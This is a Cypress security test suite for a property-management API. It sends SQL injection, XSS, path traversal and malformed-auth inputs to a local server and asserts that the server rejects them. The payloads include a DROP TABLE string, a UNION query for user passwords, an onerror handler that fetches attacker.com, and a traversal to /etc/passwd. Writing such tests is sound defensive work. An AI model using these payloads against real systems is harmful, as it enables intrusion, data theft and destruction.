describe('Backend Security Tests', () => {
    const BASE_URL = Cypress.env('BASE_URL') || 'http://localhost:3000';
    const AUTH_EMAIL = Cypress.env('AUTH_EMAIL');
    const AUTH_PASSWORD = Cypress.env('AUTH_PASSWORD');
    const PROPERTY_ID = Cypress.env('PROPERTY_ID');
    let authToken;
    before(() => {
        cy.request('POST', `${BASE_URL}/auth/login`, {
            email: AUTH_EMAIL,
            password: AUTH_PASSWORD,
        }).then((response) => {
            expect(response.status).to.equal(201);
            authToken = response.body.data.accessToken;
        });
    });
    describe('Authentication & Authorization', () => {
        it('should reject unauthenticated requests to protected endpoints', () => {
            cy.request({
                method: 'GET',
                url: `${BASE_URL}/properties`,
                failOnStatusCode: false,
            }).then((response) => {
                expect(response.status).to.equal(401);
            });
        });
        it('should reject invalid JWT tokens', () => {
            cy.request({
                method: 'GET',
                url: `${BASE_URL}/properties`,
                headers: { Authorization: 'Bearer invalid-jwt-token-12345' },
                failOnStatusCode: false,
            }).then((response) => {
                expect(response.status).to.equal(401);
            });
        });
        it('should reject expired tokens', () => {
            const expiredToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MDAwMDAwMDB9.test';
            cy.request({
                method: 'GET',
                url: `${BASE_URL}/properties`,
                headers: { Authorization: `Bearer ${expiredToken}` },
                failOnStatusCode: false,
            }).then((response) => {
                expect([401, 403]).to.include(response.status);
            });
        });
        it('should reject malformed Authorization headers', () => {
            cy.request({
                method: 'GET',
                url: `${BASE_URL}/properties`,
                headers: { Authorization: 'NotBearer token123' },
                failOnStatusCode: false,
            }).then((response) => {
                expect(response.status).to.equal(401);
            });
        });
    });
    describe('SQL Injection Prevention', () => {
        it('should block DROP TABLE injection', () => {
            cy.request({
                method: 'GET',
                url: `${BASE_URL}/properties?search=${encodeURIComponent("'; DROP TABLE properties; --")}`,
                headers: { Authorization: `Bearer ${authToken}` },
                failOnStatusCode: false,
            }).then((response) => {
                expect(response.status).not.to.equal(500);
                expect(JSON.stringify(response.body)).not.to.include('syntax error');
            });
        });
        it('should block UNION-based injection', () => {
            cy.request({
                method: 'GET',
                url: `${BASE_URL}/audit?userId=${encodeURIComponent("1' UNION SELECT password FROM users--")}`,
                headers: { Authorization: `Bearer ${authToken}` },
                failOnStatusCode: false,
            }).then((response) => {
                expect(response.status).not.to.equal(500);
            });
        });
        it('should block time-based blind injection', () => {
            cy.request({
                method: 'GET',
                url: `${BASE_URL}/properties?search=${encodeURIComponent("'; WAITFOR DELAY '00:00:05'--")}`,
                headers: { Authorization: `Bearer ${authToken}` },
                failOnStatusCode: false,
            }).then((response) => {
                expect(response.status).not.to.equal(500);
            });
        });
    });
    describe('XSS Prevention', () => {
        it('should not reflect script tags in response', () => {
            const xssPayload = '<script>alert("XSS")</script>';
            cy.request({
                method: 'GET',
                url: `${BASE_URL}/audit?action=${encodeURIComponent(xssPayload)}`,
                headers: { Authorization: `Bearer ${authToken}` },
                failOnStatusCode: false,
            }).then((response) => {
                expect(JSON.stringify(response.body)).not.to.include('<script>');
            });
        });
        it('should not reflect event handler injections', () => {
            const payload = '<img src=x onerror="fetch(\'http://attacker.com\')">';
            cy.request({
                method: 'GET',
                url: `${BASE_URL}/properties?search=${encodeURIComponent(payload)}`,
                headers: { Authorization: `Bearer ${authToken}` },
                failOnStatusCode: false,
            }).then((response) => {
                expect(JSON.stringify(response.body)).not.to.include('onerror=');
            });
        });
        it('should not reflect iframe injections', () => {
            const payload = '<iframe src="javascript:alert(1)"></iframe>';
            cy.request({
                method: 'GET',
                url: `${BASE_URL}/properties?search=${encodeURIComponent(payload)}`,
                headers: { Authorization: `Bearer ${authToken}` },
                failOnStatusCode: false,
            }).then((response) => {
                expect(JSON.stringify(response.body)).not.to.include('javascript:');
            });
        });
    });
    describe('IDOR Prevention', () => {
        it('should return 404 or 403 for random property unit IDs', () => {
            const randomId = 'fake-id-' + Math.random().toString(36).substr(2, 9);
            cy.request({
                method: 'GET',
                url: `${BASE_URL}/units/${randomId}`,
                headers: { Authorization: `Bearer ${authToken}` },
                failOnStatusCode: false,
            }).then((response) => {
                expect([400, 403, 404]).to.include(response.status);
            });
        });
        it('should not expose server errors on path traversal attempts', () => {
            cy.request({
                method: 'GET',
                url: `${BASE_URL}/units/..%2F..%2Fetc%2Fpasswd`,
                headers: { Authorization: `Bearer ${authToken}` },
                failOnStatusCode: false,
            }).then((response) => {
                expect(response.status).not.to.equal(500);
                expect(JSON.stringify(response.body)).not.to.include('root:');
            });
        });
    });
    describe('Input Validation', () => {
        it('should handle extremely large pagination values without crashing', () => {
            cy.request({
                method: 'GET',
                url: `${BASE_URL}/properties?page=99999999&limit=99999999`,
                headers: { Authorization: `Bearer ${authToken}` },
                failOnStatusCode: false,
            }).then((response) => {
                expect(response.status).to.equal(200);
                expect(response.body).to.have.property('data');
            });
        });
        it('should handle special characters without crashing', () => {
            const special = "!@#$%^&*(){}[]|\\:;\"'<>?,./`~";
            cy.request({
                method: 'GET',
                url: `${BASE_URL}/properties?search=${encodeURIComponent(special)}`,
                headers: { Authorization: `Bearer ${authToken}` },
                failOnStatusCode: false,
            }).then((response) => {
                expect([200, 400]).to.include(response.status);
                expect(response.status).not.to.equal(500);
            });
        });
        it('should handle null bytes in parameters', () => {
            cy.request({
                method: 'GET',
                url: `${BASE_URL}/properties?search=${encodeURIComponent('value\x00injected')}`,
                headers: { Authorization: `Bearer ${authToken}` },
                failOnStatusCode: false,
            }).then((response) => {
                expect(response.status).not.to.equal(500);
            });
        });
    });
    describe('Security Headers', () => {
        it('should return X-Content-Type-Options header', () => {
            cy.request({
                method: 'GET',
                url: `${BASE_URL}/properties`,
                headers: { Authorization: `Bearer ${authToken}` },
            }).then((response) => {
                expect(response.headers).to.have.property('x-content-type-options');
                expect(response.headers['x-content-type-options']).to.equal('nosniff');
            });
        });
        it('should return X-Frame-Options header', () => {
            cy.request({
                method: 'GET',
                url: `${BASE_URL}/properties`,
                headers: { Authorization: `Bearer ${authToken}` },
            }).then((response) => {
                expect(response.headers).to.have.property('x-frame-options');
            });
        });
        it('should have CORS headers configured', () => {
            cy.request({
                method: 'GET',
                url: `${BASE_URL}/properties`,
                headers: { Authorization: `Bearer ${authToken}` },
            }).then((response) => {
                expect(response.headers).to.have.property('access-control-allow-origin');
            });
        });
    });
    describe('Error Handling', () => {
        it('should not expose stack traces in error responses', () => {
            cy.request({
                method: 'GET',
                url: `${BASE_URL}/nonexistent-endpoint`,
                failOnStatusCode: false,
            }).then((response) => {
                const body = JSON.stringify(response.body);
                expect(body).not.to.include('at Object.');
                expect(body).not.to.include('node_modules');
            });
        });
        it('should not expose database details on failed login', () => {
            cy.request({
                method: 'POST',
                url: `${BASE_URL}/auth/login`,
                body: { email: 'nonexistent@test.com', password: 'wrongpassword' },
                failOnStatusCode: false,
            }).then((response) => {
                const body = JSON.stringify(response.body);
                expect(body).not.to.include('database');
                expect(body).not.to.include('MongoDB');
                expect(body).not.to.include('query');
            });
        });
        it('should return consistent error messages for invalid credentials', () => {
            cy.request({
                method: 'POST',
                url: `${BASE_URL}/auth/login`,
                body: { email: 'a@a.com', password: 'wrongpass' },
                failOnStatusCode: false,
            }).then((res1) => {
                cy.request({
                    method: 'POST',
                    url: `${BASE_URL}/auth/login`,
                    body: { email: 'nonexistent@nonexistent.com', password: 'wrongpass' },
                    failOnStatusCode: false,
                }).then((res2) => {
                    expect(res1.status).to.equal(res2.status);
                });
            });
        });
    });
    describe('Units Endpoint Security', () => {
        it('should require authentication for units endpoint', () => {
            cy.request({
                method: 'GET',
                url: `${BASE_URL}/units/${PROPERTY_ID}`,
                failOnStatusCode: false,
            }).then((response) => {
                expect(response.status).to.equal(401);
            });
        });
        it('should not crash on malformed property ID', () => {
            cy.request({
                method: 'GET',
                url: `${BASE_URL}/units/${encodeURIComponent('<>"\'{}')}`,
                headers: { Authorization: `Bearer ${authToken}` },
                failOnStatusCode: false,
            }).then((response) => {
                expect([400, 404]).to.include(response.status);
                expect(response.status).not.to.equal(500);
            });
        });
    });
    describe('Audit Logs Endpoint Security', () => {
        it('should require authentication for audit endpoint', () => {
            cy.request({
                method: 'GET',
                url: `${BASE_URL}/audit`,
                failOnStatusCode: false,
            }).then((response) => {
                expect(response.status).to.equal(401);
            });
        });
        it('should not expose sensitive data in audit logs filters', () => {
            cy.request({
                method: 'GET',
                url: `${BASE_URL}/audit?action=${encodeURIComponent("'; SELECT * FROM users--")}`,
                headers: { Authorization: `Bearer ${authToken}` },
                failOnStatusCode: false,
            }).then((response) => {
                expect(response.status).not.to.equal(500);
            });
        });
    });
});
//# sourceMappingURL=security-backend.cy.js.map